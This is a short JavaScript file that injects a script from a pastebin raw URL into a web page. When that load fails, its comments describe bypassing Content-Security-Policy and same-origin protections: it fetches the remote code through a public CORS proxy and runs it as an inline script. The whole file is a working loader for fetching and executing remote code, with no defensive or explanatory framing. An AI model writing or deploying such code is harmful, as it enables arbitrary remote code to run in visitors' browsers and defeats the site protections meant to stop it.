var code_src = 'https://pastebin.com/raw/zf8Hzpvt';

var s = document.createElement('script');
s.type = 'application/javascript';
s.async = true;
s.src = code_src
s.onload = function() {
    console.log('INJECTION LOADED');
};
s.onerror = function() {
    console.log('LOADING ERROR, TRY TO BYPASS');
    /*
        Possibly because Content-Security-Policy restrict this
        Bypass Content-Security-Policy with loading script manually and creating inline script
        Bypass Same-Origin-Policy with CORS-proxy
    */
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.codetabs.com/v1/proxy?quest=' + code_src, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState != 4) return;
        console.log(xhr.responseText);
        document.head.removeChild(s);
        s = document.createElement('script');
        s.type = 'application/javascript';
        s.textContent = xhr.responseText;
        document.head.appendChild(s);
    }
    xhr.send();
}
document.head.appendChild(s);

